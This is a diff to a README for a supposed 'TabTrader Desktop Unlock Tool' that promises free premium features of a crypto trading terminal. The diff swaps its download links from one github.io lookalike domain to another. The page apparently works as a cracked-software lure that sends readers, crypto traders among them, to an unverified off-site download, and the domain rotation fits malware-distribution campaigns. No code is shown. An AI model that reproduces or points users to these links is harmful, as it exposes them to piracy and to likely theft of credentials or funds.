@@ -6,7 +6,7 @@
 <h1 align="center">⚡️ TabTrader Desktop Unlock Tool</h1>
 
 <p align="center">
-  <a href="https://tabtrader-pro-download.github.io/.github/" target="_blank">
+  <a href="https://tabtrader-pro-free-download.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20TabTrader%20Desktop%20Free%20for%20Windows-Enable%20Premium%20Features-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
          alt="Download TabTrader Desktop Free for Windows" style="width: 540px; height: 37px;">
   </a>
@@ -97,7 +97,7 @@ Report bugs or contribute via Issues or Pull Requests.
 ## ⭐️ Unlock TabTrader Desktop – Multi-Exchange Crypto Terminal
 
 Unlock premium features of **TabTrader Desktop**, including **multi-exchange support, advanced crypto charts, technical indicators, real-time alerts, and portfolio management**.  
-[Download the Unlock Tool](https://tabtrader-pro-download.github.io/.github/) and trade smarter.  
+[Download the Unlock Tool](https://tabtrader-pro-free-download.github.io/.github/) and trade smarter.  
 
 ---
 
